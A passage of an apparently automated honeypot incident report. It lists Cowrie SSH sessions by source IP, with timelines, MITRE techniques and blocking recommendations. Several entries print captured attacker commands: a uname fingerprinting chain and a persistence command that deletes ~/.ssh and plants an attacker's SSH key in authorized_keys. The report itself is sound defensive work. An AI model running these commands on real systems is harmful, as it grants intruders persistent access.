| `2026-08-29 12:41:35` | `cowrie.command.input` |
| `2026-08-29 12:41:35` | `cowrie.command.input` |
| `2026-08-29 12:41:35` | `cowrie.command.input` |
| `2026-08-29 12:41:35` | `cowrie.command.input` |
| `2026-08-29 12:41:35` | `cowrie.log.closed` |
| `2026-08-29 12:41:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e81601515ee1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 12:43 |
| **Last Seen** | 2026-08-29 12:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:43:00` | `cowrie.session.connect` |
| `2026-08-29 12:43:00` | `cowrie.client.version` |
| `2026-08-29 12:43:00` | `cowrie.client.kex` |
| `2026-08-29 12:43:01` | `cowrie.login.success` |
| `2026-08-29 12:43:01` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:43:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 12:43:01` | `cowrie.direct-tcpip.data` |
| `2026-08-29 12:43:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d925e03349f5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:43 |
| **Last Seen** | 2026-08-29 12:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:43:13` | `cowrie.session.connect` |
| `2026-08-29 12:43:13` | `cowrie.client.version` |
| `2026-08-29 12:43:13` | `cowrie.client.kex` |
| `2026-08-29 12:43:15` | `cowrie.login.success` |
| `2026-08-29 12:43:16` | `cowrie.session.params` |
| `2026-08-29 12:43:16` | `cowrie.command.input` |
| `2026-08-29 12:43:16` | `cowrie.command.input` |
| `2026-08-29 12:43:16` | `cowrie.command.input` |
| `2026-08-29 12:43:16` | `cowrie.command.input` |
| `2026-08-29 12:43:16` | `cowrie.command.input` |
| `2026-08-29 12:43:16` | `cowrie.command.success` |
| `2026-08-29 12:43:16` | `cowrie.command.input` |
| `2026-08-29 12:43:16` | `cowrie.command.input` |
| `2026-08-29 12:43:16` | `cowrie.command.input` |
| `2026-08-29 12:43:16` | `cowrie.command.input` |
| `2026-08-29 12:43:16` | `cowrie.log.closed` |
| `2026-08-29 12:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aad65ddebba8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:44 |
| **Last Seen** | 2026-08-29 12:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:44:56` | `cowrie.session.connect` |
| `2026-08-29 12:44:56` | `cowrie.client.version` |
| `2026-08-29 12:44:56` | `cowrie.client.kex` |
| `2026-08-29 12:44:57` | `cowrie.login.success` |
| `2026-08-29 12:44:58` | `cowrie.session.params` |
| `2026-08-29 12:44:58` | `cowrie.command.input` |
| `2026-08-29 12:44:58` | `cowrie.command.input` |
| `2026-08-29 12:44:58` | `cowrie.command.input` |
| `2026-08-29 12:44:58` | `cowrie.command.input` |
| `2026-08-29 12:44:58` | `cowrie.command.input` |
| `2026-08-29 12:44:58` | `cowrie.command.success` |
| `2026-08-29 12:44:58` | `cowrie.command.input` |
| `2026-08-29 12:44:58` | `cowrie.command.input` |
| `2026-08-29 12:44:58` | `cowrie.command.input` |
| `2026-08-29 12:44:58` | `cowrie.command.input` |
| `2026-08-29 12:44:58` | `cowrie.log.closed` |
| `2026-08-29 12:44:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2984a5a22c03

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 12:45 |
| **Last Seen** | 2026-08-29 12:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:45:19` | `cowrie.session.connect` |
| `2026-08-29 12:45:19` | `cowrie.client.version` |
| `2026-08-29 12:45:19` | `cowrie.client.kex` |
| `2026-08-29 12:45:20` | `cowrie.login.success` |
| `2026-08-29 12:45:20` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:45:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 12:45:21` | `cowrie.direct-tcpip.data` |
| `2026-08-29 12:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2cb0ec6136d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:46 |
| **Last Seen** | 2026-08-29 12:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:46:47` | `cowrie.session.connect` |
| `2026-08-29 12:46:47` | `cowrie.client.version` |
| `2026-08-29 12:46:48` | `cowrie.client.kex` |
| `2026-08-29 12:46:48` | `cowrie.login.success` |
| `2026-08-29 12:46:49` | `cowrie.session.params` |
| `2026-08-29 12:46:49` | `cowrie.command.input` |
| `2026-08-29 12:46:49` | `cowrie.command.input` |
| `2026-08-29 12:46:49` | `cowrie.command.input` |
| `2026-08-29 12:46:49` | `cowrie.command.input` |
| `2026-08-29 12:46:49` | `cowrie.command.input` |
| `2026-08-29 12:46:49` | `cowrie.command.success` |
| `2026-08-29 12:46:49` | `cowrie.command.input` |
| `2026-08-29 12:46:49` | `cowrie.command.input` |
| `2026-08-29 12:46:49` | `cowrie.command.input` |
| `2026-08-29 12:46:49` | `cowrie.command.input` |
| `2026-08-29 12:46:50` | `cowrie.log.closed` |
| `2026-08-29 12:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baa57550826b

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-29 12:47 |
| **Last Seen** | 2026-08-29 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:47:14` | `cowrie.session.connect` |
| `2026-08-29 12:47:14` | `cowrie.client.version` |
| `2026-08-29 12:47:14` | `cowrie.client.kex` |
| `2026-08-29 12:47:15` | `cowrie.login.success` |
| `2026-08-29 12:47:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd0b530458c3

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-29 12:47 |
| **Last Seen** | 2026-08-29 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:47:14` | `cowrie.session.connect` |
| `2026-08-29 12:47:14` | `cowrie.client.version` |
| `2026-08-29 12:47:14` | `cowrie.client.kex` |
| `2026-08-29 12:47:15` | `cowrie.login.success` |
| `2026-08-29 12:47:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-076d891c0cd0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:48 |
| **Last Seen** | 2026-08-29 12:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:48:53` | `cowrie.session.connect` |
| `2026-08-29 12:48:53` | `cowrie.client.version` |
| `2026-08-29 12:48:53` | `cowrie.client.kex` |
| `2026-08-29 12:48:54` | `cowrie.login.success` |
| `2026-08-29 12:48:55` | `cowrie.session.params` |
| `2026-08-29 12:48:55` | `cowrie.command.input` |
| `2026-08-29 12:48:55` | `cowrie.command.input` |
| `2026-08-29 12:48:55` | `cowrie.command.input` |
| `2026-08-29 12:48:55` | `cowrie.command.input` |
| `2026-08-29 12:48:55` | `cowrie.command.input` |
| `2026-08-29 12:48:55` | `cowrie.command.success` |
| `2026-08-29 12:48:55` | `cowrie.command.input` |
| `2026-08-29 12:48:55` | `cowrie.command.input` |
| `2026-08-29 12:48:55` | `cowrie.command.input` |
| `2026-08-29 12:48:55` | `cowrie.command.input` |
| `2026-08-29 12:48:55` | `cowrie.log.closed` |
| `2026-08-29 12:48:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bebc2e330b6

| Field | Detail |
|---|---|
| **Source IP** | `200.46.212[.]206` |
| **First Seen** | 2026-08-29 12:50 |
| **Last Seen** | 2026-08-29 12:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:50:36` | `cowrie.session.connect` |
| `2026-08-29 12:50:36` | `cowrie.client.version` |
| `2026-08-29 12:50:36` | `cowrie.client.kex` |
| `2026-08-29 12:50:37` | `cowrie.login.success` |
| `2026-08-29 12:50:37` | `cowrie.session.params` |
| `2026-08-29 12:50:37` | `cowrie.command.input` |
| `2026-08-29 12:50:37` | `cowrie.command.failed` |
| `2026-08-29 12:50:38` | `cowrie.log.closed` |
| `2026-08-29 12:50:38` | `cowrie.session.params` |
| `2026-08-29 12:50:38` | `cowrie.command.input` |
| `2026-08-29 12:50:38` | `cowrie.session.file_download` |
| `2026-08-29 12:50:38` | `cowrie.log.closed` |
| `2026-08-29 12:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.46.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `200.46.212[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6058c4bd5832

| Field | Detail |
|---|---|
| **Source IP** | `200.46.212[.]206` |
| **First Seen** | 2026-08-29 12:50 |
| **Last Seen** | 2026-08-29 12:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:50:39` | `cowrie.session.connect` |
| `2026-08-29 12:50:39` | `cowrie.client.version` |
| `2026-08-29 12:50:39` | `cowrie.client.kex` |
| `2026-08-29 12:50:39` | `cowrie.login.success` |
| `2026-08-29 12:50:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.46.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `200.46.212[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99646122f811

| Field | Detail |
|---|---|
| **Source IP** | `200.46.212[.]206` |
| **First Seen** | 2026-08-29 12:50 |
| **Last Seen** | 2026-08-29 12:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:50:39` | `cowrie.session.connect` |
| `2026-08-29 12:50:39` | `cowrie.client.version` |
| `2026-08-29 12:50:39` | `cowrie.client.kex` |
| `2026-08-29 12:50:40` | `cowrie.login.success` |
| `2026-08-29 12:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.46.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `200.46.212[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-054c40b2d0bb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 12:52 |
| **Last Seen** | 2026-08-29 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:52:25` | `cowrie.session.connect` |
| `2026-08-29 12:52:25` | `cowrie.client.version` |
| `2026-08-29 12:52:26` | `cowrie.client.kex` |
| `2026-08-29 12:52:27` | `cowrie.login.success` |
| `2026-08-29 12:52:27` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:52:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 12:52:27` | `cowrie.direct-tcpip.data` |
| `2026-08-29 12:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5daaf849f548

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:52 |
| **Last Seen** | 2026-08-29 12:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:52:48` | `cowrie.session.connect` |
| `2026-08-29 12:52:48` | `cowrie.client.version` |
| `2026-08-29 12:52:48` | `cowrie.client.kex` |
| `2026-08-29 12:52:50` | `cowrie.login.success` |
| `2026-08-29 12:52:51` | `cowrie.session.params` |
| `2026-08-29 12:52:51` | `cowrie.command.input` |
| `2026-08-29 12:52:51` | `cowrie.command.input` |
| `2026-08-29 12:52:51` | `cowrie.command.input` |
| `2026-08-29 12:52:51` | `cowrie.command.input` |
| `2026-08-29 12:52:51` | `cowrie.command.input` |
| `2026-08-29 12:52:51` | `cowrie.command.success` |
| `2026-08-29 12:52:51` | `cowrie.command.input` |
| `2026-08-29 12:52:51` | `cowrie.command.input` |
| `2026-08-29 12:52:51` | `cowrie.command.input` |
| `2026-08-29 12:52:51` | `cowrie.command.input` |
| `2026-08-29 12:52:52` | `cowrie.log.closed` |
| `2026-08-29 12:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-735a3ca1cc2b

| Field | Detail |
|---|---|
| **Source IP** | `117.247.51[.]66` |
| **First Seen** | 2026-08-29 12:53 |
| **Last Seen** | 2026-08-29 12:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:53:50` | `cowrie.session.connect` |
| `2026-08-29 12:53:50` | `cowrie.client.version` |
| `2026-08-29 12:53:50` | `cowrie.client.kex` |
| `2026-08-29 12:53:52` | `cowrie.login.success` |
| `2026-08-29 12:53:52` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.51[.]66` to AbuseIPDB if not already reported
- [ ] Block `117.247.51[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5176d6527e68

| Field | Detail |
|---|---|
| **Source IP** | `41.65.118[.]172` |
| **First Seen** | 2026-08-29 12:53 |
| **Last Seen** | 2026-08-29 12:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:53:57` | `cowrie.session.connect` |
| `2026-08-29 12:53:57` | `cowrie.client.version` |
| `2026-08-29 12:53:57` | `cowrie.client.kex` |
| `2026-08-29 12:53:58` | `cowrie.login.success` |
| `2026-08-29 12:53:59` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.65.118[.]172` to AbuseIPDB if not already reported
- [ ] Block `41.65.118[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-070221c9e1e6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:54 |
| **Last Seen** | 2026-08-29 12:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:54:27` | `cowrie.session.connect` |
| `2026-08-29 12:54:28` | `cowrie.client.version` |
| `2026-08-29 12:54:28` | `cowrie.client.kex` |
| `2026-08-29 12:54:29` | `cowrie.login.success` |
| `2026-08-29 12:54:30` | `cowrie.session.params` |
| `2026-08-29 12:54:30` | `cowrie.command.input` |
| `2026-08-29 12:54:30` | `cowrie.command.input` |
| `2026-08-29 12:54:30` | `cowrie.command.input` |
| `2026-08-29 12:54:30` | `cowrie.command.input` |
| `2026-08-29 12:54:30` | `cowrie.command.input` |
| `2026-08-29 12:54:30` | `cowrie.command.success` |
| `2026-08-29 12:54:30` | `cowrie.command.input` |
| `2026-08-29 12:54:30` | `cowrie.command.input` |
| `2026-08-29 12:54:30` | `cowrie.command.input` |
| `2026-08-29 12:54:30` | `cowrie.command.input` |
| `2026-08-29 12:54:31` | `cowrie.log.closed` |
| `2026-08-29 12:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfa8bec8c817

| Field | Detail |
|---|---|
| **Source IP** | `118.27.150[.]95` |
| **First Seen** | 2026-08-29 12:54 |
| **Last Seen** | 2026-08-29 12:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:54:29` | `cowrie.session.connect` |
| `2026-08-29 12:54:29` | `cowrie.client.version` |
| `2026-08-29 12:54:30` | `cowrie.client.kex` |
| `2026-08-29 12:54:31` | `cowrie.login.success` |
| `2026-08-29 12:54:32` | `cowrie.session.params` |
| `2026-08-29 12:54:32` | `cowrie.command.input` |
| `2026-08-29 12:54:32` | `cowrie.command.failed` |
| `2026-08-29 12:54:33` | `cowrie.log.closed` |
| `2026-08-29 12:54:33` | `cowrie.session.params` |
